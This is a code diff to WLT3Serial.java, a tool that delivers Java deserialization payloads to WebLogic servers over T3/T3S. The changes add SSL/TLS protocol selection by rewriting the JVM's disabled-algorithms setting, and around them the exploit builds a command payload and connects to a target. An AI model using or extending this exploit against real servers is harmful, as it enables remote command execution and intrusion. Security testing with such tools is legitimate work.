@@ -1,7 +1,7 @@
 /*
 	WLT3Serial.java
 	
-	v0.2 (12/2/2017)
+	v0.3 ()
 	
 	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options then executes exploit with those options.
 */
@@ -164,10 +164,11 @@ public class WLT3Serial {
 			}
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command);
-
-			//display connection information			
+			
+			//set desired SSL/TLS protocol(s) (if using T3S) and display connection information			
 			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port));
 			if(t3s) {
+				setSSLTLSProtocol();
 				String encProt = System.getProperty("jdk.tls.client.protocols");
 				System.out.print(" (with ");
 				if(encProt.contains("SSLv2Hello")) {
@@ -207,19 +208,67 @@ public class WLT3Serial {
 		}
 	}
 	
-	//check current JVM security policy, and enable SSLv3 communication if disabled by default
-	static void enableSSL() {
+	//Disable all SSL/TLS protocols not chosen during application initialization in JVM
+	private static void setSSLTLSProtocol() {
+		String tlsSysProp = System.getProperty("jdk.tls.client.protocols");
 		String tlsSecProp = Security.getProperty("jdk.tls.disabledAlgorithms");
-		if(tlsSecProp.contains("SSLv3")) {
-			if(tlsSecProp.contains("SSLv3,")) {
-				tlsSecProp = tlsSecProp.replace("SSLv3,","");
-				tlsSecProp = tlsSecProp.trim();
+		if(tlsSecProp==null) tlsSecProp = "";
+		ArrayList<String> protocols = new ArrayList<String>(5);
+		protocols.add("SSLv2Hello");
+		protocols.add("SSLv3");
+		protocols.add("TLSv1");
+		protocols.add("TLSv1.1");
+		protocols.add("TLSv1.2");		
+		
+		String disabledProts = null;
+		if(tlsSysProp.contains("SSL")) { //using SSL protocol(s) for connection
+			protocols.remove("SSLv3");
+			if(tlsSysProp.contains("SSLv2Hello")) protocols.remove("SSLv2Hello");
+			disabledProts = join(protocols,", ");
+			
+			if(tlsSecProp.contains("SSLv3")) {
+				tlsSecProp = tlsSecProp.replace("SSLv3", disabledProts);
 			} else {
-				tlsSecProp = tlsSecProp.replace("SSLv3","");
 				tlsSecProp = tlsSecProp.trim();
+				if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
+				tlsSecProp += disabledProts;
 			}
-			Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+		} else { //using TLS protocol for connection
+			switch(tlsSysProp) {
+				case "TLSv1.2":
+					protocols.remove("TLSv1.2");
+					break;
+				case "TLSv1.1":
+					protocols.remove("TLSv1.1");
+					break;
+				case "TLSv1":
+					protocols.remove("TLSv1");
+					break;
+			}
+			
+			if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
+			tlsSecProp += join(protocols,", ");
 		}
+		Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+	}
+	
+	//join List<String> into String with specified delimeter
+	private static String join(List<String> list,String delimeter) {
+		if(delimeter==null) delimeter="";
+		if(list==null) return null;
+		
+		String[] arr = new String[list.size()];
+		arr = list.toArray(arr);
+		String retVal = "";
+		int i=0;
+		while(i<arr.length-1) {
+			if(arr[i]==null) arr[i] = "";
+			retVal += arr[i]+delimeter;
+			i++;
+		}
+		if(arr[i]==null) arr[i] = "";
+		retVal += arr[i];
+		return retVal;
 	}
 	
 	//print Usage information
